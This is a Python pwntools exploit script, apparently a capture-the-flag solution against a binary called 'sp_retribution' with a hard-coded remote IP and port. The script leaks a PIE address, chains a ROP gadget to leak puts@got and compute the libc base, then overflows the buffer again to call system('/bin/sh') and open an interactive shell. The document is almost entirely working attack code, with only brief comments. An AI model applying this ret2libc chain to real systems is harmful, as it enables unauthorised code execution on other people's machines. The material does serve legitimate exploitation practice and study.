'''
PIE leak exploit
ret2libc
'''
from pwn import *

context.log_level = 'debug'
context.terminal = ['wt.exe', '-w', '0', 'split-pane', 'wsl.exe', '-d', 'Ubuntu']

elf = ELF("./sp_retribution")
libc = ELF("./glibc/libc-2.23.so")
if sys.argv[1] == "remote":
    r = remote("64.227.37.214", 31185)
else:
    r = process("./sp_retribution")
    # gdb.attach(r)

r.sendlineafter(b">> ", b'2')
r.sendafter(b"[*] Insert new coordinates: x = [0x53e5854620fb399f], y = ", b"AAAAAAAA")
r.recvuntil(b"AAAAAAAA")
leak_addr = u64(r.recvuntil(b"\n", drop=True).ljust(8, b"\x00"))
log.info("leak_addr: " + hex(leak_addr))
pie_base = leak_addr - 0xd70
log.info("pie_base: " + hex(pie_base))

putsplt = pie_base + elf.symbols["puts"]
log.info("putsplt: " + hex(putsplt))
putsgot = pie_base + elf.got["puts"]
log.info("putsgot: " + hex(putsgot))
poprdi = pie_base + 0xd33
log.info("poprdi: " + hex(poprdi))
ret = pie_base + 0xd34
main = pie_base + elf.symbols["main"]
payload = b"A"*0x58 + p64(poprdi) + p64(putsgot) + p64(putsplt) + p64(main)
r.sendline(payload)

# leak puts@got address
r.recvuntil(b"Coordinates have been reset!\x1B[1;34m\n")
leak_addr = u64(r.recvline()[:-1].ljust(8, b"\x00"))
log.info("leak_addr: " + hex(leak_addr))
libc_base = leak_addr - libc.symbols["puts"]
log.info("libc_base: " + hex(libc_base))
system = libc_base + libc.symbols["system"]
log.info("system: " + hex(system))
binsh_str = next(libc.search(b"/bin/sh")) + libc_base # 或者使用ROPgadget： ROPgadget --binary ./glibc/libc-2.23.so --string "/bin/sh"
log.info("binsh_str: " + hex(binsh_str))

payload = b"A"*0x58 + p64(poprdi) + p64(binsh_str) + p64(system)

r.sendlineafter(b">> ", b'2')
r.sendafter(b"[*] Insert new coordinates: x = [0x53e5854620fb399f], y = ", b"AAAAAAAA")
r.recvuntil(b"[*] Verify new coordinates? (y/n): ")
r.sendline(payload)

r.interactive()
